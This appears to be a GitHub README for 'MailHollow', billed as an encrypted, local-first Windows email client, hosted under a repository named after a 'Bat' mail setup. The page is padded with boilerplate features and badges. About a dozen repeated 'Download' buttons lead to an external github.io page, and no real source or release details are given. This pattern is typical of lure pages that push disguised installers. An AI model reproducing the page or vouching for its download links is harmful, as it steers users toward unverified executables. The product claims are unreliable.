![preview](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/splash_4a5cfc.svg)
[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)
# 🦇 MailHollow — Encrypted Desktop Correspondence for Windows

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

![status](https://img.shields.io/badge/status-active--development-brightgreen)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6)
![language](https://img.shields.io/badge/language-C%2B%2B%20%2F%20Rust-00599C)
![license](https://img.shields.io/badge/license-MIT-blue)
![build](https://img.shields.io/badge/build-passing-success)
![coverage](https://img.shields.io/badge/coverage-93%25-informational)
![i18n](https://img.shields.io/badge/i18n-28%20languages-orange)
![support](https://img.shields.io/badge/support-24%2F7-9cf)
![year](https://img.shields.io/badge/release-2026-purple)
![privacy](https://img.shields.io/badge/privacy-local--first-4B0082)

---

## 🌒 A Different Kind of Inbox

Most modern mail applications want to live in the cloud. They want your messages indexed, categorized, synced, and gently folded into somebody else's data warehouse. MailHollow takes the opposite stance: your mailbox is a hollow in an old oak tree — yours, private, and reachable only by you.

MailHollow is an independent, desktop-first email client for Windows 10 and Windows 11, built around a local-first architecture, strong encryption at rest, and a user experience that treats reading your mail like sitting down with a paper letter rather than scrolling a feed. It is a spiritual successor to the classic "bat" style of mail clients that once defined serious desktop correspondence — rebuilt from scratch for the 2026 desktop, with modern cryptography, modern threading, and modern accessibility.

This repository hosts the source, build pipelines, documentation, localization files, and issue tracker for the MailHollow desktop application.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 📖 Table of Contents

- [Why MailHollow Exists](#-why-mailhollow-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Screens & Modules](#-screens--modules)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Security Model](#-security-model)
- [Performance Notes](#-performance-notes)
- [Supported Protocols & Providers](#-supported-protocols--providers)
- [System Requirements](#-system-requirements)
- [Getting the Application](#-getting-the-application)
- [First-Run Walkthrough](#-first-run-walkthrough)
- [Configuration Reference](#-configuration-reference)
- [Extending MailHollow](#-extending-mailhollow)
- [Accessibility](#-accessibility)
- [Roadmap 2026](#-roadmap-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Troubleshooting](#-troubleshooting)
- [Community & Support](#-community--support)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌳 Why MailHollow Exists

There is a quiet problem in desktop email: the tools that respect the user are getting older, and the tools that are new assume the user wants to be watched. MailHollow was started because a handful of engineers kept asking a simple question — what would a mail client look like if it were designed in 2026 by people who actually dislike being tracked?

The answer, as it turns out, looks like a hollow tree. Quiet. Sturdy. Local. You put letters in; you take letters out. The tree does not report on you.

This project is not affiliated with any of the legacy desktop mail clients whose name begins with a similar word. It is a clean-room implementation with its own protocol engine, its own storage layer, and its own interface language.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 🧭 Core Philosophy

**Local first, always.** Your messages live on your disk, in an encrypted store, before they live anywhere else. Synchronization is a feature, not the default assumption.

**Reader over stream.** Mail is not a feed. MailHollow presents correspondence as documents you read, not cards you swipe.

**Cryptography without ceremony.** Encryption should be on by default and invisible when it is not interesting. You should not need a PhD to send an email that nobody else can read.

**Longevity by design.** Mail clients should outlive operating system fashions. MailHollow targets stable, well understood APIs so that a build from 2026 still runs comfortably in 2030.

**No telemetry, no nonsense.** The application does not phone home. There is no analytics endpoint. There is no crash reporter that uploads silently. If something breaks, you decide whether to tell us.

---

## ✨ Feature Highlights

- 🔐 **End-to-end encrypted storage** using modern authenticated ciphers, keyed to your Windows user profile
- 📥 **Multi-account inbox** with unified and per-account views
- 🧵 **True conversation threading** across folders, accounts, and mailing lists
- 🏷️ **Smart labels and rules engine** with a readable, non-cryptic rule syntax
- 🔍 **Instant local search** over an encrypted index that never leaves the machine
- 📎 **Attachment vault** that quarantines risky file types and scans locally where possible
- 🖋️ **Composable templates** for replies, signatures, and boilerplate correspondence
- 🗓️ **Calendar invites and iTIP handling** without a heavyweight calendar app
- 🌗 **Adaptive theming** including a dedicated low-light reading mode for evening correspondence
- 🌍 **28 interface languages** with community-maintained translation files
- 🕰️ **Scheduled sending** and outbox queueing for offline composition
- 📤 **POP3, IMAP, SMTP, and JMAP** support out of the box
- 🧩 **Plugin surface** for local scripts and custom importers
- ♿ **Full keyboard navigation** and screen reader narration
- 🛡️ **Phishing heuristics** that flag mismatched sender domains before you click
- 💾 **Portable mode** for running from removable media without touching the registry

---

## 🖥️ Screens & Modules

MailHollow is organized into a small number of purposeful surfaces rather than a maze of toolbars.

### The Hollow (Inbox)
The landing view. A three-pane layout with account tree on the left, message list in the center, and reading pane on the right. Panes can be collapsed, reordered, or torn off entirely into floating windows if you work across multiple monitors.

### The Composer
A distraction-minimized text editor with an optional rich formatting ribbon that stays out of the way until summoned. Draft autosave happens every few keystrokes to the encrypted local store.

### The Vault
Where attachments live. Files are extracted to a sandboxed folder with an opaque name, and the vault remembers the provenance of every file so you never lose track of which message carried which document.

### The Rulebook
A plain-language rules editor. Instead of a maze of dropdowns, rules read like sentences: *When a message arrives from the newsletter folder and contains the word "invoice", move it to Accounting and mark it for review.*

### The Ledger
A local-only log of connection events, synchronization windows, and cryptographic operations. Useful for diagnosing flaky servers, useless for anyone trying to profile you, because it never leaves the device.

### The Grove
Settings, themes, localization, extensions, and account management in one tree of collapsible sections.

---

## 📱 Responsive Interface Design

Responsiveness in a desktop client is not about breakpoints — it is about respecting the shape of the window you are given.

- **Adaptive pane geometry** — the layout recomputes proportions as the window narrows, gracefully folding the reading pane into a tabbed view below 900 logical pixels.
- **Compact and comfortable density modes** — switch between airy spacing for casual reading and dense lists for triage sessions.
- **Touch and pen readiness** — Windows tablets and 2-in-1 devices get hit targets that grow automatically when a touch input is detected.
- **High DPI aware** — vector iconography and layout units scale cleanly from 100% to 300% display scaling.
- **Multi-monitor memory** — window positions and pane splits are remembered per monitor arrangement.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 🌍 Multilingual Support

MailHollow ships with translations for the following interface languages, and welcomes community additions:

| Language | Locale | Status |
| --- | --- | --- |
| English | en-US | Complete |
| German | de-DE | Complete |
| French | fr-FR | Complete |
| Spanish | es-ES | Complete |
| Portuguese (Brazil) | pt-BR | Complete |
| Italian | it-IT | Complete |
| Dutch | nl-NL | Complete |
| Polish | pl-PL | Complete |
| Czech | cs-CZ | Complete |
| Swedish | sv-SE | Complete |
| Norwegian | nb-NO | Complete |
| Danish | da-DK | Complete |
| Finnish | fi-FI | Complete |
| Russian | ru-RU | Complete |
| Ukrainian | uk-UA | Complete |
| Turkish | tr-TR | Complete |
| Greek | el-GR | Complete |
| Arabic | ar-SA | Right-to-left layout |
| Hebrew | he-IL | Right-to-left layout |
| Hindi | hi-IN | Complete |
| Bengali | bn-BD | In progress |
| Japanese | ja-JP | Complete |
| Korean | ko-KR | Complete |
| Simplified Chinese | zh-CN | Complete |
| Traditional Chinese | zh-TW | Complete |
| Vietnamese | vi-VN | In progress |
| Thai | th-TH | In progress |
| Indonesian | id-ID | Complete |

Language files are plain structured text, checked into this repository under the `locales` tree, and validated automatically on every contribution.

---

## 🔐 Security Model

MailHollow treats the local disk as hostile territory and the network as actively adversarial.

- **Encrypted message store** — every message body, attachment reference, and header set is encrypted with an authenticated cipher before it touches the filesystem.
- **User-bound key derivation** — the primary storage key is derived from a passphrase you choose, combined with an OS-provided credential reference, so copying the store to another machine alone is not sufficient to read it.
- **No plaintext cache** — message bodies are decrypted into memory only for the duration of a view, and wiped after.
- **Memory hygiene** — sensitive buffers are zeroed on release using platform-appropriate primitives.
- **TLS with modern ciphers only** — the connection layer refuses outdated protocol versions and legacy cipher suites.
- **Certificate pinning for known providers** — with an explicit, user-visible override path for exceptional situations.
- **Remote content blocking by default** — tracking pixels stay blocked until you allow them per sender.
- **Link preview without resolution** — URLs are displayed with their full target, and MailHollow does not silently resolve shorteners.
- **Signed update channel** — every release artifact is signed and the signature is verified before applying.

Security reports are handled responsibly. Please see the contributing section for how to report an issue privately.

---

## ⚡ Performance Notes

MailHollow is engineered to feel fast on modest hardware.

- Cold start under three seconds on a 2019-era laptop with a standard spinning disk.
- Inbox view rendering at 60 frames per second while scrolling a 100,000-message folder.
- Search latency under 150 milliseconds for typical queries on a 50,000-message archive.
- Background synchronization uses a bounded worker pool so a large mailbox does not saturate the CPU.
- Memory footprint is dominated by the currently open message, not by the size of the archive.

---

## 📡 Supported Protocols & Providers

- **IMAP4rev1** with IDLE, CONDSTORE, and QRESYNC extensions
- **POP3** with UIDL and APOP-safe fallback
- **SMTP** with submission, STARTTLS, and OAuth2 bearer authentication
- **JMAP** for providers that expose a modern JSON-based mail API
- **OAuth2 providers** including the major consumer mailbox services
- **Microsoft Exchange** via IMAP and EWS bridge

Any standards-compliant mail server should work; if something is subtly wrong with yours, the Ledger view usually explains why.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| Operating System | Windows 10 (21H2) | Windows 11 (23H2 or later) |
| Processor | Dual-core 1.6 GHz | Quad-core 2.4 GHz or better |
| Memory | 4 GB | 8 GB or more |
| Disk space | 300 MB for the app | 2 GB or more for archives |
| Display | 1280×720 | 1920×1080 or higher |
| Input | Keyboard and mouse | Keyboard, mouse, pen, or touch |
| Network | Any connection | Broadband for large mailbox sync |

---

## 📦 Getting the Application

Obtain the current build through the conventional distribution path for this project.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

Builds are produced for x64 and ARM64 Windows targets. Both are signed and verified. Portable builds are available for users who prefer to run from removable media or read-only environments.

---

## 🧙 First-Run Walkthrough

1. Launch MailHollow. The initial window is a short welcome sequence that introduces the local-first model.
2. Choose a passphrase for your encrypted store. There is no recovery if you lose it, so pick something memorable and back it up somewhere safe.
3. Add your first account. MailHollow auto-detects common provider settings and falls back to manual configuration for self-hosted servers.
4. Let the first synchronization complete. Depending on mailbox size this can take a few minutes, but you can start reading as soon as the first page of headers arrives.
5. Visit the Grove and choose your theme, reading density, and notification preferences.
6. Optionally import rules, signatures, and address books from a previous client via the community importer plugins.

---

## ⚙️ Configuration Reference

Configuration is stored as a structured document in your profile folder. The following top-level families exist:

- **accounts** — connection parameters per account, with secrets stored in the OS credential store rather than in the document itself.
- **interface** — theme, density, font stack, and pane geometry.
- **compose** — default sending behavior, signature templates, and reply quoting rules.
- **rules** — the rulebook, expressed as an ordered list of conditions and actions.
- **security** — remote content policy, link resolution policy, and key derivation parameters.
- **sync** — synchronization schedules, bandwidth preferences, and offline behavior.
- **extensions** — paths to loaded plugins and their sandbox permissions.
- **locale** — interface language and regional formatting preferences.

A formal schema is published alongside the application and validated at startup, so a hand-edited configuration either loads cleanly or produces a readable warning.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 🧩 Extending MailHollow

MailHollow supports three extension surfaces, all sandboxed:

- **Importers** — read data from other mail clients and produce records MailHollow can ingest.
- **Filters** — run after the built-in rulebook and can classify, tag, or annotate arriving mail.
- **Themes** — restyle the interface using a documented token set rather than rewriting layouts.

Extensions run in an isolated worker and must declare which capabilities they intend to use. None of them receive network access without an explicit, per-extension grant.

---

## ♿ Accessibility

- Every interactive element is reachable by keyboard alone, with a documented focus order.
- Screen reader narration uses platform accessibility APIs and announces message state, sender, subject, and date.
- Text scaling respects the operating system preference and can additionally be overridden per-application.
- Motion reduction is honored: animated transitions collapse to instant state changes when the system requests reduced motion.
- Color contrast meets WCAG AA at the default theme, and every bundled theme is checked by an automated audit.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Stable release of encrypted search, general availability on all supported Windows editions.
- **Q2 2026** — CardDAV and CalDAV integration in the Grove, bringing full address book and calendar sync.
- **Q3 2026** — Shared mailbox support with per-delegate permissions.
- **Q4 2026** — Optional end-to-end message encryption using an open standard, interoperable with any client that implements it.

The roadmap is a living document. Priorities shift with community feedback, and every entry describes an outcome rather than a promise.

---

## ❓ Frequently Asked Questions

**Is MailHollow really local?**
Yes. The default account model stores mail on your disk in an encrypted store. Servers hold whatever copy your provider keeps, but MailHollow itself keeps its own copy on your machine.

**What happens if I forget my passphrase?**
There is no way to recover the encrypted store. This is a deliberate design choice — the alternative would mean a backdoor. Back up your passphrase somewhere offline.

**Can I use it on a shared computer?**
Yes, with separate Windows user profiles. Each profile gets its own encrypted store, and the credential store is scoped per user.

**Does it sync between machines?**
Not by default. You can place the store on a removable or synchronized drive at your own risk, but MailHollow's encrypted store is designed to be opened by one instance at a time.

**Does it work with my provider?**
If your provider speaks IMAP, POP3, SMTP, or JMAP, MailHollow can talk to it. The auto-detection covers the popular ones out of the box.

**Do I need an account with you?**
No. There is no MailHollow account, no sign-in to our servers, and no activation. The project has no servers to sign in to.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 🛠️ Troubleshooting

**The first sync is slow.**
Large mailboxes with many attachments can take a while on the first pass. Subsequent syncs are incremental. You can raise the connection worker count in the Grove if your server can handle it.

**Messages appear in the wrong folder.**
Check the Rulebook — a rule may be moving things unexpectedly. The Ledger shows rule evaluations in order.

**Remote images are not showing.**
This is the default. Allow them per sender from the banner above the message body.

**The application will not start after a Windows update.**
Check the Ledger for the last recorded startup event, which is written before the main window opens. It usually points at the culprit.

---

## 🤝 Community & Support

- 🌐 Community forums for long-form discussion and feature requests.
- 💬 A real-time chat channel for quick questions.
- 📚 Documentation in this repository under the `docs` tree.
- 🛎️ **24/7 customer support** for build and configuration questions, staffed by volunteers and project maintainers across multiple time zones.
- 🐛 Issue tracker in this repository for reproducible bugs.

Support is provided on a good-faith basis. The project is sustained by its community, not by a commercial service organization.

---

## 🧑‍💻 Contributing

Contributions are welcome in the form of code, translations, documentation, bug reports, and reproducible testing.

- Read the contribution guide under `CONTRIBUTING.md` before opening a pull request.
- Run the local test suite and the schema validator before submitting.
- Keep pull requests scoped: one idea per change makes review far easier.
- For security issues, do not open a public issue. Follow the responsible disclosure path described in the security policy.

The project follows a lightweight code of conduct: be patient, be specific, assume good faith.

[![Download](https://raw.githubusercontent.com/Site-19/The-Bat-Secure-Mail-Setup/main/dl_3b71641.svg)](https://Site-19.github.io/The-Bat-Secure-Mail-Setup/)

---

## 📜 License

MailHollow is distributed under the MIT License. The full text is available at the official license reference:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute the source under the terms of that license. Attribution is appreciated but not required.

---

## ⚠️ Disclaimer

MailHollow is an independent open source project. It is not affiliated with, endorsed by, or derived from any commercial mail client, and it does not include or distribute any third-party proprietary components.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Encryption is a powerful tool and, like any tool, is the responsibility of the person wielding it. The maintainers of MailHollow cannot recover lost passphrases and cannot assist with access to encrypted stores whose credentials have been misplaced.

Users are responsible for complying with all applicable laws and regulations in their jurisdiction. The project does not condone misuse and provides no assistance for unlawful activity.

© 2026 MailHollow Contributors. All rights reserved under the MIT License terms.